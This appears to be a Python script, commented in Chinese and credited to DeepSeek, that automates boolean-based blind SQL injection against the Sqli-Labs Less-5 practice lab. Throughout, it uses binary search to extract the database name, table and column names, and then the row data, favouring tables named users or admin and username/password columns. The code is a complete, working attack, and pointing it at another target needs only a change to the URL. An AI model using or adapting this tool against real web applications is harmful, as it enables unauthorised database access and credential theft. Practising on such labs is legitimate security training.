"""
SQL 布尔盲注自动化脚本（Less-5 专用）
作者：DeepSeek
适用关卡：Sqli-Labs Less-5 / Less-6（修改闭合符号即可）
原理：基于页面返回的布尔状态，利用二分法逐字符猜解数据
"""

import requests
import time

# ==================== 配置区 ====================
URL = "http://127.0.0.1/sqli-labs/Less-5/?id=1'"
TRUE_FLAG = "You are in..."          # 页面返回真时的特征字符串
TIMEOUT = 5                           # 请求超时时间（秒）
DELAY = 0.1                           # 请求间隔（秒），避免请求过快被ban
# ===============================================


def check(payload):
    """
    发送 Payload，返回布尔值
    
    Args:
        payload: SQL 注入 Payload（不需要包含开头的闭合符号）
    
    Returns:
        True:  条件成立（页面显示 You are in...）
        False: 条件不成立（页面空白或报错）
    """
    full_url = URL + payload
    try:
        r = requests.get(full_url, timeout=TIMEOUT)
        time.sleep(DELAY)  # 控制请求频率
        return TRUE_FLAG in r.text
    except requests.exceptions.RequestException as e:
        print(f"\n[!] 网络请求异常: {e}")
        return False
    except Exception as e:
        print(f"\n[!] 未知异常: {e}")
        return False


def get_length(query):
    """
    二分法获取查询结果的长度
    
    Args:
        query: SQL 子查询，如 "database()"
    
    Returns:
        查询结果的字符串长度，失败返回 0
    """
    low, high = 1, 150
    while low < high:
        mid = (low + high) // 2
        payload = f" and length(({query}))>{mid} --+"
        if check(payload):
            low = mid + 1
        else:
            high = mid
    
    # 验证最终结果
    if check(f" and length(({query}))={low} --+"):
        return low
    return 0


def get_string(query, length):
    """
    二分法逐字符获取字符串
    
    Args:
        query: SQL 子查询
        length: 目标字符串的长度
    
    Returns:
        猜解出的完整字符串
    """
    result = ""
    for i in range(1, length + 1):
        low, high = 32, 126  # 可打印 ASCII 字符范围
        
        while low < high:
            mid = (low + high) // 2
            payload = f" and ascii(substr(({query}),{i},1))>{mid} --+"
            if check(payload):
                low = mid + 1
            else:
                high = mid
        
        result += chr(low)
        print(f"\r[+] 正在获取: {result}", end="")
    
    print()  # 换行
    return result


def get_count(query):
    """
    获取记录总数（用于 select count(*) 场景）
    
    Args:
        query: 完整的计数查询，如 "select count(*) from users"
    
    Returns:
        记录总数，失败返回 0
    """
    low, high = 0, 100
    while low < high:
        mid = (low + high) // 2
        payload = f" and ({query})>{mid} --+"
        if check(payload):
            low = mid + 1
        else:
            high = mid
    
    if check(f" and ({query})={low} --+"):
        return low
    return 0


def get_database_name():
    """获取当前数据库名"""
    print("\n[1] 获取数据库名...")
    db_len = get_length("database()")
    if db_len == 0:
        print("[!] 获取数据库名长度失败")
        return None
    print(f"[数据库名长度] {db_len}")
    
    db_name = get_string("database()", db_len)
    print(f"[数据库名] {db_name}")
    return db_name
def get_tables(db_name):
    """获取指定数据库下的所有表名"""
    print("\n[2] 获取表数量...")
    tbl_count_query = f"(select count(*) from information_schema.tables where table_schema='{db_name}')"
    tbl_count = get_count(tbl_count_query)
    print(f"[表数量] {tbl_count}")
    
    if tbl_count == 0:
        print("[!] 未找到任何表")
        return []
    
    print("\n[3] 获取表名...")
    tables = []
    for idx in range(tbl_count):
        print(f"\n[表 {idx + 1}]")
        
        # 获取表名长度（注意括号）
        tbl_len_query = f"(select length(table_name) from information_schema.tables where table_schema='{db_name}' limit {idx},1)"
        tbl_len = get_length(tbl_len_query)
        print(f"  长度: {tbl_len}")
        
        # 获取表名（注意括号）
        tbl_name_query = f"(select table_name from information_schema.tables where table_schema='{db_name}' limit {idx},1)"
        tbl_name = get_string(tbl_name_query, tbl_len)
        print(f"  表名: {tbl_name}")
        
        tables.append(tbl_name)
    
    return tables



def get_columns(db_name, table_name):
    """获取指定表的列信息"""
    print(f"\n[4] 获取 {table_name} 表的列信息...")
    
    col_count_query = f"select count(*) from information_schema.columns where table_schema='{db_name}' and table_name='{table_name}'"
    col_count = get_count(col_count_query)
    print(f"[{table_name} 表的列数量] {col_count}")
    
    if col_count == 0:
        print("[!] 未找到任何列")
        return []
    
    columns = []
    for idx in range(col_count):
        print(f"\n[列 {idx + 1}]")
        
        # 获取列名长度
        col_len_query = f"select length(column_name) from information_schema.columns where table_schema='{db_name}' and table_name='{table_name}' limit {idx},1"
        col_len = get_length(col_len_query)
        print(f"  长度: {col_len}")
        
        # 获取列名
        col_name_query = f"select column_name from information_schema.columns where table_schema='{db_name}' and table_name='{table_name}' limit {idx},1"
        col_name = get_string(col_name_query, col_len)
        print(f"  列名: {col_name}")
        
        columns.append(col_name)
    
    return columns


def get_table_data(table_name, columns):
    """获取表数据"""
    print(f"\n[5] 获取 {table_name} 表数据...")
    
    # 获取记录数
    row_count_query = f"select count(*) from {table_name}"
    row_count = get_count(row_count_query)
    print(f"[{table_name} 表记录数] {row_count}")
    
    if row_count == 0:
        print("[!] 表中无数据")
        return
    
    # 确定要获取的列（优先 username 和 password）
    target_columns = []
    if "username" in columns and "password" in columns:
        target_columns = ["username", "password"]
    else:
        target_columns = columns[:2] if len(columns) >= 2 else columns
    
    print(f"[目标列] {', '.join(target_columns)}")
    
    # 逐行获取数据
    for row_idx in range(row_count):
        print(f"\n[记录 {row_idx + 1}]")
        row_data = {}
        
        for col in target_columns:
            # 获取字段值长度
            val_len_query = f"select length({col}) from {table_name} limit {row_idx},1"
            val_len = get_length(val_len_query)
            
            # 获取字段值
            val_query = f"select {col} from {table_name} limit {row_idx},1"
            val = get_string(val_query, val_len)
            
            row_data[col] = val
        
        # 格式化输出
        if "username" in row_data and "password" in row_data:
            print(f"  {row_data['username']} : {row_data['password']}")
        else:
            for col, val in row_data.items():
                print(f"  {col}: {val}")


def main():
    """主程序入口"""
    print("=" * 50)
    print("[*] SQL 布尔盲注自动化脚本")
    print(f"[*] 目标 URL: {URL}")
    print("=" * 50)
    
    start_time = time.time()
    
    # 1. 获取数据库名
    db_name = get_database_name()
    if not db_name:
        print("[!] 脚本终止")
        return
    
    # 2. 获取所有表名
    tables = get_tables(db_name)
    if not tables:
        print("[!] 脚本终止")
        return
    
    # 3. 选择目标表（优先 users 表）
    target_table = None
    priority_tables = ["users", "user", "admin", "member"]
    
    for pt in priority_tables:
        if pt in tables:
            target_table = pt
            break
    
    if not target_table:
        target_table = tables[0]
        print(f"\n[*] 未找到优先级表，默认选择第一个表: {target_table}")
    else:
        print(f"\n[*] 目标表: {target_table}")
    
    # 4. 获取列信息
    columns = get_columns(db_name, target_table)
    if not columns:
        print("[!] 脚本终止")
        return
    
    # 5. 获取表数据
    get_table_data(target_table, columns)
    
    # 完成
    elapsed_time = time.time() - start_time
    print("\n" + "=" * 50)
    print(f"[*] 盲注完成！总耗时: {elapsed_time:.2f} 秒")
    print("=" * 50)


if __name__ == "__main__":
    main()